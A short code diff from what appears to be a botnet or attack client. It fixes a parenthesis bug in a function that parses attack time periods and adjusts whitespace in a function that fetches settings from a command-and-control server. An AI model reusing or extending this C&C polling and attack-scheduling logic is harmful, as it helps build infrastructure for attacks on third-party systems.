@@ -154,7 +154,7 @@ def validateAttackPeriod(period, default=1):
         return [period]
     # in this case we have a range 
     except ValueError:
-        periodRange = map((lambda t: int(t), period.split("-")))
+        periodRange = map((lambda t: int(t)), period.split("-"))
         periodRange = list(periodRange)
         if len(periodRange) == 1:
             raise Exception("Wrong format for period!")
@@ -177,7 +177,7 @@ def validateCCUpdate(server, schema, last_modified):
     configuration = {}
     # try to perform update of the configuration from the C&C
     try:
-        cc_config = requests.get(server + '/settings').json()
+        cc_config = requests.get(server + '/settings').json()    
         # check for updated instructions
         # C&C update has priority only if it is more recent
         if cc_config['last_modified'] >= last_modified:
